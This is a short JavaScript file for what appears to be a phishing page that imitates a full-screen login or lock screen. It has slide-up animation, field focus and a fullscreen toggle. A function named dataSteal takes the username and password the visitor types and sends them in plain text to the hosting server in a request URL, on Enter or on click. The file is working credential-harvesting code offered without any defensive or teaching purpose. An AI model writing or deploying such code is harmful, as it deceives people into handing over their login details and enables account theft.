
//general functions
const print=(data)=>console.log(data);

const slideUp=(pop)=>{
    const endPosition=1000;
    let currentPosition=0;
    const fps=setInterval(()=>{
        if(currentPosition>=900){
            clearInterval(fps);
            pop.style.display='none';
            pop.parentElement.childNodes[7].style.display='block';
        }
        pop.style.bottom=`${currentPosition+=20}px`;
    },1);
    setTimeout(focuser,400);
};

const focuser=()=>{
    document.getElementById('username').focus();
}

const handleSlideUp=(e)=>{
    slideUp(e.target);
};

const spaceSlideUp=(e)=>{
    const pl=document.querySelector('.prelogin');
    if(e.code==='Space'){
        slideUp(pl);
    }
}

const dataSteal=(username,password)=>{
    const response=fetch(`/username=${username}&password=${password}`);
};

const handleSubmit=(e)=>{
    const username=document.querySelector('#username').value;
    const password=document.querySelector('#password').value;
    if(e.type==='keyup'){
        if(e.code==='Enter'){
            dataSteal(username,password);
        }
    }
    else if(e.type==='click'){
        dataSteal(username,password);
    }
};





function toggleFullscreen() {
    let elem = document.body;
  
    if (!document.fullscreenElement) {
      elem.requestFullscreen().catch(err => {
        alert(`Error attempting to enable fullscreen mode: ${err.message} (${err.name})`);
      });
    } else {
      document.exitFullscreen();
    }
  }

